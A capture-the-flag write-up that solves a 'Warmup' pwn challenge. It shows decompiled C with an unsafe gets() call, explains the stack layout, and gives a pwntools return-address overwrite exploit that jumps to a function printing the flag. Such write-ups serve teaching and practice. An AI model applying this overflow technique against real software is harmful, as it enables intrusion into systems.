# Warmup (pwn)

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/84f252b4-3878-478d-874c-d158109bd1c0)  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/92cca5b2-2d66-4db3-a906-6552a86893c2)  

Running the program prints what seems to be an address and asks for input.
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/836d7fc8-117a-423c-ba6d-eef807d7a597)  

Loading this binary in ghidra gives the following  

```c
void main(void)

{
  char local_88 [64];
  char local_48 [64];
  
  write(1,"-Warm Up-\n",10);
  write(1,&DAT_0040074c,4);
  sprintf(local_88,"%p\n",easy);
  write(1,local_88,9);
  write(1,&DAT_00400755,1);
  gets(local_48);
  return;
}

void easy(void)

{
  system("cat flag.txt");
  return;
}
```

It seems our guess was correct. The program prints the address for the "win" function and then gets user input with `gets`. Sigh...  
Pretty easy. Since the binary does not use PIE, then we don't even need to worry about offsets.  

## Explanation  
Okay, from this function the STACK will look something like the following
```
|      local_48    |
|     local_48+1   |
|        ....      |
|        ....      |
|   local_48+63    |
|     saved rbp    |
| saved return addr|
```
So if we can abuse `gets` to keep writing into the stack, we can overwrite the saved return address so that the functions returns to whatever address we want.  
In this case, we would like to return to `easy`.  
Also, since this is a 64 bit binary we have to keep track of stack alignment.
Without further ado:  
```python
from pwn import *
ret = p64(0x00000000004004a1)
easy = p64(0x40060d) 
r = process('./warmup')
exploit = 72*b'A' + ret + easy

r.sendline(exploit)
r.interactive()
```

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/8e45fc68-c635-4513-b9dd-234d7bff80c1)  



